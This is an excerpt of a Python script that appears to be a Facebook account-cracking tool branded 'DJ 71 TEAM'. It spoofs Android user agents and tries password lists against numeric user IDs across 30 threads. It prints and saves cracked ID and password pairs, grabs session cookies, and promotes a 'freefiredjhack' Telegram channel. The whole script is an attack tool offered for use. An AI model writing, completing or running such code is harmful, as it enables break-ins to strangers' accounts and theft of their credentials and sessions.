...
os.system('espeak -a 300 " SUBSCRIBE    D J 71   GAMING "')
os.system("subscribe dj71 gaming")
os.system("clear")
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mDJ 71 TEAM ]\33[1;38m   ║\033[1;31m 
╠══[FACEBOOK                 • IYANUR.35  ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mIYANUR420  ]   ║\33[1;34m   
╠══[REGIONAL                 • BANGLADESH ]   ║\33[1;35m 
╠══[TOOLS                    • Paid DJ71  ]   ║ \33[1;32m   
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open https://t.me/freefiredjhack')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        print("\033[1;33m[☘️️\033[1;33m] \033[1;36mYOUR SIM CODE :\033[1;32m "+code)
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [✅️] OK DJ-71-OK.txt')
    print(' [❌] CP DJ-71-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DJ71-HACKER]\033[1;36m❤️[%s/%s]🖤\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The DJ-71𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The DJ-71𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mDJ71-CP\033[1;33m]\033[1;91m {uid}|{ps}")
